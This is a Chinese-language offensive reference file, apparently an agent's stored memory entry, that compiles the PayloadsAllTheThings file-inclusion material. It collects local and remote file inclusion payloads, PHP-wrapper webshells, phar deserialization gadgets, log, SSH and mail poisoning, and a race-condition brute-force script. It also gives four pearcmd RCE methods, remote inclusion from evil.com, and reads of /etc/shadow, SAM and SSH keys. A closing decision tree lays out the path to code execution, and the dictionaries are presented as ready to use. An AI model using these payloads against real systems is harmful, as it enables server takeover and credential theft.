---
name: kb_pati_file_inclusion_poc_2026
description: PayloadsAllTheThings File Inclusion 全量 POC 手册 — LFI/RFI 基础变体/php伪协议wrapper全解/LFI2RCE七链路/convert.iconv盲读文件/pearcmd四法/字典索引
metadata:
  node_type: memory
  type: reference
  source: https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/
---

# PATI File Inclusion 全量 POC 手册 (2026-08-14 抓取归档)

> 来源: PayloadsAllTheThings 官方仓库 `File Inclusion/` 目录全量学习归档。
> 本手册 = 仓库 3 个 md（README.md + Wrappers.md + LFI-to-RCE.md）全量整合 + 中文注释。
> 原始字典/脚本已归档到 [`../payloads/file_inclusion_pati/`](../payloads/file_inclusion_pati/README.md)。
> 关联手册: [[kb_lfi_rfi_2026]]（同主题实战版）、[[kb_file_upload_lfi_deep_2026]]。

## 〇、一句话定位

LFI 与 Path Traversal 的区别：**Path Traversal 只读文件，File Inclusion 能执行任意代码**。凡有 `include($_GET['page'])` 一类入口，目标就不是"读文件"而是"打 RCE"。

---

## 一、LFI 基础利用（README）

### 1.1 基础 Payload

```php
<?php $file = $_GET['page']; include($file); ?>
```
```http
http://example.com/index.php?page=../../../etc/passwd
```

### 1.2 Null Byte 截断（PHP < 5.3.4）

```http
http://example.com/index.php?page=../../../etc/passwd%00
```
**实战实例**: Joomla! Component Web TV 1.0 — CVE-2010-1470
```http
{{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00
```

### 1.3 Double Encoding 双重编码

```http
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

### 1.4 UTF-8 编码绕过（%c0%ae 叠加）

```http
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```

### 1.5 Path Truncation 路径截断（文件名 >4096 字节被截断）

```http
http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE]
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
```

### 1.6 Filter Bypass 过滤器绕过

```http
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

---

## 二、RFI 远程文件包含

> `allow_url_include` 自 PHP 5 起默认关闭，默认配置下 RFI 已失效。LFI 的绕过手法大多可复用。

```ini
allow_url_include = On
```
```http
http://example.com/index.php?page=http://evil.com/shell.txt
```

### 2.1 Null Byte
```http
http://example.com/index.php?page=http://evil.com/shell.txt%00
```

### 2.2 Double Encoding
```http
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```

### 2.3 Bypass allow_url_include（SMB 协议，仅 Windows）

当 `allow_url_include` 和 `allow_url_fopen` 都关闭时，**Windows 目标仍可用 SMB 协议远程包含**：
1. 创建一个对所有人开放的共享
2. 共享里放 `shell.php`（PHP 代码）
3. 包含它：`http://example.com/index.php?page=\\10.0.0.1\share\shell.php`

---

## 三、PHP Wrappers 伪协议大全（Wrappers.md）

### 3.1 php://filter — 读源码（最常用，大小写不敏感）

| 过滤器 | 作用 |
|--------|------|
| `read=string.rot13` | 输出 rot13 混淆 |
| `convert.iconv.utf-8.utf-16` | utf8→utf16 转换 |
| `convert.base64-encode` | base64 输出（读源码首选） |

```http
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php   # 大小写混写
```

**压缩链 + 多次链**（大文件 / 受限字符外带）：
```http
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s
php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php
```

**读取工具**：
```bash
./kadimus -u "http://example.com/index.php?page=vuln" -S -f "index.php%00" -O index.php --parameter page
curl "http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d > index.php
```

### 3.2 php://filter 链 → 全 RCE（无文件写入）

**工具**: [synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)
```bash
python3 php_filter_chain_generator.py --chain '<?php phpinfo();?>'
# 输出一长串 iconv|base64-encode|base64-decode... 组成的 php://filter 链，直接放 file 参数即执行
```

**工具**: [LFI2RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Files/LFI2RCE.py)（本库已归档，生成定制 payload）
```bash
# 目标: index.php 的参数 file，执行命令 id，落地代码 <?=`$_GET[0]`;;?>
curl "127.0.0.1:8000/index.php?0=id&file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...|convert.base64-decode/resource=/etc/passwd"
```

### 3.3 data:// — 伪协议 RCE

payload base64 = `<?php system($_GET['cmd']);echo 'Shell done !'; ?>`
```http
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
```
**彩蛋 — XSS 绕过 Chrome Auditor**（`application/x-httpd-php` MIME）：
```http
http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
```

### 3.4 expect:// — 命令执行（需 expect 扩展）

```http
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```

### 3.5 input://（php://input）— POST body 当代码

```bash
curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v
# 或 Kadimus 自动化
./kadimus -u "https://example.com/index.php?page=php://input%00" -C '<?php echo shell_exec("id"); ?>' -T input
```

### 3.6 zip:// — ZIP 内文件包含

```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php
zip payload.zip payload.php; mv payload.zip shell.jpg; rm payload.php   # 伪装成 jpg 上传
```
```http
http://example.com/index.php?page=zip://shell.jpg%23payload.php   # %23 = #
```

### 3.7 phar:// — Phar 反序列化（PHP < 8）

#### 结构：phar 内直接包含
```php
<?php
  $phar = new Phar('archive.phar');
  $phar->startBuffering();
  $phar->addFromString('test.txt', '<?php phpinfo(); ?>');
  $phar->setStub('<?php __HALT_COMPILER(); ?>');
  $phar->stopBuffering();
?>
```
```bash
curl http://127.0.0.1:8001/?page=phar:///var/www/html/archive.phar/test.txt
```

#### 反序列化：⚠️ PHP 8+ 已移除该特性
**触发点不止 include**，任何对 phar 的文件操作都会反序列化其元数据：
`include` / `file_get_contents` / `file_put_contents` / `copy` / `file_exists` / `is_executable` / `is_file` / `is_dir` / `is_link` / `is_writable` / `fileperms` / `fileinode` / `filesize` / `fileowner` / `filegroup` / `fileatime` / `filemtime` / `filectime` / `filetype` / `getimagesize` / `exif_read_data` / `stat` / `lstat` / `touch` / `md5_file` 等。

需要至少一个含 `__destruct()` 或 `__wakeup()` 的类，例如：
```php
class AnyClass {
    public $data = null;
    function __construct($data) { $this->data = $data; }
    function __destruct() { system($this->data); }
}
...
echo file_exists($_GET['page']);   // 仅 file_exists 也触发
```
```php
// 构造恶意 phar
$phar = new Phar('deser.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
class AnyClass { public $data = null; function __construct($data) { $this->data = $data; } function __destruct() { system($this->data); } }
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
```
```bash
curl http://127.0.0.1:8001/?page=phar:///var/www/html/deser.phar
```
**JPG 魔数伪装**：`setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>")` 可绕过文件类型检测。

### 3.8 convert.iconv:// + dechunk:// — 无回显盲读文件

**原理**：`convert.iconv` 把输入按编码转换（可指数级膨胀触发内存错误）；`dechunk` 在字符串无换行且以 `A-Fa-f0-9` 开头时整串清空。组合出"错误回显/时间"作为 oracle，逐字符盲读任意文件。

**要求**：后端不能用 `file_exists`/`is_file`；漏洞参数放 POST（GET 限长 135 字符）。

**工具**: [synacktiv/php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit)
```bash
python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0
```

#### 3.8.1 wrapwrap — 给文件内容加前缀后缀（JSON/XML 注入回显）
**工具**: [ambionics/wrapwrap](https://github.com/ambionics/wrapwrap)
```bash
./wrapwrap.py /etc/passwd '{"message":"' '"}' 1000
./wrapwrap.py /etc/passwd '<root><name>' '</name></root>' 1000
```
可用于如下代码（file_get_contents → json_decode → echo）：
```php
<?php
  $data = file_get_contents($_POST['url']);
  $data = json_decode($data);
  echo $data->message;
?>
```

#### 3.8.2 lightyear — 盲读文件原语
**工具**: [ambionics/lightyear](https://github.com/ambionics/lightyear)
```bash
code remote.py     # 编辑 Remote.oracle
./lightyear.py test        # 测试实现
./lightyear.py /etc/passwd # dump 文件
```

---

## 四、LFI → RCE 全链路（LFI-to-RCE.md）

### 4.1 /proc/*/fd — 上传打 FD

1. 上传大量 shell（如 100 个）
2. 包含 `/proc/$PID/fd/$FD`（PID 和 FD 都盲猜）
```http
http://example.com/index.php?page=/proc/$PID/fd/$FD
```

### 4.2 /proc/self/environ — UA 注入

像日志一样，把 payload 放 `User-Agent` 头，会反射进 environ 文件：
```http
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```

### 4.3 iconv — glibc OOB RCE（CVE-2024-2961）

利用 `convert.iconv` 触发 glibc OOB，配合 LFI 读 `/proc/self/maps` + 下载 glibc，重写 `zend_mm_heap` 把 `free` 换成 `system`。

**条件**: PHP 7.0.0(2015)–8.3.7(2024) + glibc ≤ 2.39 + 可用 `convert.iconv`/`zlib.inflate`/`dechunk` 过滤器。
**利用**: [ambionics/cnext-exploits](https://github.com/ambionics/cnext-exploits/tree/main)

### 4.4 上传 → 直接包含

能上传就注入 shell payload（`<?php system($_GET['c']); ?>`），然后包含：
```http
http://example.com/index.php?page=path/to/uploaded/file.png
```
**技巧**: 为了文件可读性，注入点优先放图片/doc/pdf 的元数据里（EXIF 等）。

### 4.5 上传 → 条件竞争（uploadlfi.py 已归档）

上传 + 自包含竞态，反复上传拉高胜率，然后爆破 `/tmp/[0-9a-zA-Z]{6}`：
```python
import itertools, requests, sys
print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
    requests.post('http://target.com/index.php?c=index.php', f)
print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://target.com/index.php?c=/tmp/php' + fname
    r = requests.get(url)
    if 'load average' in r.text:  # <?php echo system('uptime');
        print('[+] We have got a shell: ' + url); sys.exit(0)
print('[x] Something went wrong, please try again')
```

### 4.6 上传 → FindFirstFile（仅 Windows）

Windows `FindFirstFile` 支持掩码：`*`/`<<`=任意序列，`?`/`>`=单字符。
上传的文件落在 `C:\Windows\Temp\php[A-F0-9]{4}.tmp`，用通配符省去爆破 65536 个名字：
```http
http://site/vuln.php?inc=c:\windows\temp\php<<
```

### 4.7 phpinfo() 辅助 — 泄露临时文件名

phpinfo() 会显示 `$_GET`/`$_POST`/`$_FILES`。多次上传 POST 到 phpinfo 页 + 控制读取时机 → 拿到上传临时文件名 → LFI 包含之。
**脚本**: [phpinfolfi.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)（本库已归档）

### 4.8 可控日志文件 — 日志包含

向目标服务（Apache/SSH/邮件/vsftpd…）发带 payload 的请求，payload 写进日志，再 LFI 包含日志：

**常用日志路径全集**：
```http
/var/log/apache/access.log          /var/log/apache/error.log
/var/log/apache2/access.log         /var/log/apache2/error.log
/var/log/nginx/access.log           /var/log/nginx/error.log
/var/log/vsftpd.log                 /var/log/sshd.log
/var/log/mail                       /var/log/httpd/error_log
/usr/local/apache/log/error_log     /usr/local/apache2/log/error_log
```

**RCE via SSH**：用 PHP 代码当用户名 ssh 登录，再包含 auth.log
```bash
ssh '<?php system($_GET["cmd"]);?>'@10.10.10.10
```
```http
http://example.com/index.php?page=/var/log/auth.log&cmd=id
```

**RCE via Mail**：SMTP 发信把 payload 塞进邮件主题，包含 `/var/log/mail`
```
mail from: mail@example.com
rcpt to: root
data
subject: <?php echo system($_GET["cmd"]); ?>
.
```
或命令行：`mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null`

**RCE via Apache logs**：UA 投毒（⚠️ 日志会转义双引号，payload 用单引号）
```bash
curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
```

### 4.9 PHP Session 包含

PHP session 存 `/var/lib/php5/sess_[PHPSESSID]` 或 `/var/lib/php/sessions/sess_[PHPSESSID]`。把 payload 放进可控 session 字段，再 LFI 包含 session 文件：
```http
POST login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
POST login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
```

### 4.10 PEARCMD — 4 种利用法（Docker PHP 默认自带）

`pearcmd.php` 在 `/usr/local/lib/php/pearcmd.php`（每个官方 Docker PHP 镜像都有）。用 `$_SERVER['argv']` 拿参数，需 `register_argc_argv = On`（默认开）。

**法1: config-create**（最常用）
```http
/vuln.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_GET['cmd'])?>+/tmp/exec.php
/vuln.php?file=/tmp/exec.php&cmd=phpinfo();die();
```

**法2: man_dir**
```http
/vuln.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+
/vuln.php?file=/tmp/exec.php&c=id
```
生成的配置里含 webshell。

**法3: download**（需外网）
```http
/vuln.php?file=/usr/local/lib/php/pearcmd.php&+download+http://<ip>:<port>/exec.php
/vuln.php?file=exec.php&c=id
```

**法4: install**（需外网，落地在 `/tmp/pear/download/exec.php`）
```http
/vuln.php?file=/usr/local/lib/php/pearcmd.php&+install+http://<ip>:<port>/exec.php
/vuln.php?file=/tmp/pear/download/exec.php&c=id
```

### 4.11 凭据文件 — 提权 / SSH

**Windows**：提取 SAM/system（`WINDOWS/repair/` 目录），`samdump2 SYSTEM SAM > hashes.txt` 爆破或 Pass-the-Hash：
```http
http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
```

**Linux**：读 `/etc/shadow` 爆破 → SSH；或读私钥 `id_rsa`：
```http
http://example.com/index.php?page=../../../../../../etc/shadow
```
先包含 `/etc/passwd` 确认活跃用户，再逐一试 `/<HOME>/.ssh/id_rsa`。

---

## 五、本地字典 / 脚本索引（已归档）

原始 payload 字典与利用脚本全部归档到 [`../payloads/file_inclusion_pati/`](../payloads/file_inclusion_pati/)，生产环境"开箱即用"：

### Intruders/ 字典（13 个）
| 文件 | 用途 |
|------|------|
| `Traversal.txt` (378KB) | 全量目录穿越 payload，ffuf/Burp Intruder 直接跑 |
| `JHADDIX_LFI.txt` (28KB) | JHADDIX 综合 LFI 字典 |
| `List_Of_File_To_Include.txt` (24KB) | 全平台可包含文件清单 |
| `List_Of_File_To_Include_NullByteAdded.txt` (9.5KB) | 同上 + %00 变体 |
| `dot-slash-PathTraversal_and_LFI_pairing.txt` (65KB) | 点斜线穿越+包含配对字典 |
| `Windows-files.txt` (7KB) | Windows 文件清单 |
| `LFI-WindowsFileCheck.txt` (2KB) | Windows LFI 快速验证 |
| `Linux-files.txt` (1.5KB) | Linux 文件清单 |
| `php-filter-iconv.txt` (1.4KB) | 全部 iconv 转换对（filter 链构造用） |
| `LFI-FD-check.txt` | /proc/self/fd/N 检查清单 |
| `BSD-files.txt` | BSD 文件清单 |
| `Mac-files.txt` | macOS 文件清单 |
| `Web-files.txt` | 网站敏感文件（robots/配置/phpmyadmin/web.config） |
| `simple-check.txt` | 快速探测（passwd/boot.ini/win.ini 编码变体） |

### Files/ 脚本（3 个）
| 文件 | 用途 |
|------|------|
| `LFI2RCE.py` | php://filter iconv 链 RCE payload 生成器 |
| `phpinfolfi.py` | phpinfo() 辅助泄露上传临时文件 → LFI RCE |
| `uploadlfi.py` | 上传条件竞争 → LFI RCE |

---

## 六、实战决策树（速查）

```
拿到 include($_GET['page']) 类入口：
├─ 1. 先读文件: php://filter/convert.base64-encode/resource=index.php → 摸清源码
├─ 2. 有 phpinfo()? → phpinfolfi.py 泄露 tmp 文件 → 包含
├─ 3. 能上传? → EXIF 元数据注入 / zip.jpg 伪协议 / phar 反序列化 / 条件竞争
├─ 4. 有日志可控? → UA/SSH/邮件投毒 → 包含日志 (4.8)
├─ 5. Docker 环境? → pearcmd.php 4 法 (4.10)
├─ 6. allow_url_include=On? → php://input / data:// / RFI
├─ 7. 有 iconv + glibc 老版本? → CVE-2024-2961 (4.3)
├─ 8. 上述皆失败 → wrapwrap / lightyear / oracle 盲读文件 → 换攻击面
└─ 9. Windows? → FindFirstFile 通配符 / SMB RFI / NTFS 流 / SAM 凭据
```

## 七、参考链接

- [PATI File Inclusion 官方页](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/)
- [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) · [filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit)
- [wrapwrap](https://github.com/ambionics/wrapwrap) · [lightyear](https://github.com/ambionics/lightyear) · [cnext-exploits (CVE-2024-2961)](https://github.com/ambionics/cnext-exploits/tree/main)
- [Iconv CVE-2024-2961 分析 (Charles Fol)](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)
